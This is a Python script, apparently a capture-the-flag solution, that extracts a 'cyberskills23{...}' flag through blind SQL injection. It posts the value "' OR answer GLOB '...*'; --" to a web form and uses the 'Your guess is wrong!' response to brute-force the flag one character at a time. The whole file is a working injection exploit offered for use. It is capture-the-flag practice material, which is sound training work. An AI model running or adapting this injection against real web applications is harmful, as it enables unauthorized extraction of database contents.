import requests
import urllib.parse
from sys import stdout
# Define the URL to which the request is sent
print("Execute this script in the console with 'python main.py' or you might not see any output.\n")
url = input("Enter the full url: ") # your url here

def check_guess(page):
    if "Your guess is wrong!".lower() in str(page).lower():
        return False
    return True

def brute_flag():
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_^" # _ at the end because it is a sql wildcard
    save_guess = "cyberskills23{}"

    # iterate through possibilities
    while True:
        for char in charset:
            if char == '^': # pretty certainly not in flag, last char in charset
                print(f"Char not in charset or flag complete: {save_guess}")
                completed = True
                return save_guess

            # get "cyberskills23{..."
            guess = save_guess[:len(save_guess)-1]
            # insert guess and reappend ending
            guess += char + "*}"
            inside_string = f"' OR answer GLOB '{guess}'; --"
            data = f"guess={urllib.parse.quote_plus(inside_string)}" # 'guess=+OR+answer+LIKE+'cyberskills23{y%}';+--

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            response = requests.post(url=url, data=data, headers=headers)
            if response.status_code == 500 or response.status_code == 404:
                print("Connection error: " + response.status_code)
                return

            if check_guess(response.text):
                save_guess = save_guess[:len(save_guess)-1] + char + "}"
                stdout.write(save_guess + "\r")
                break

if __name__ == '__main__':
    brute_flag()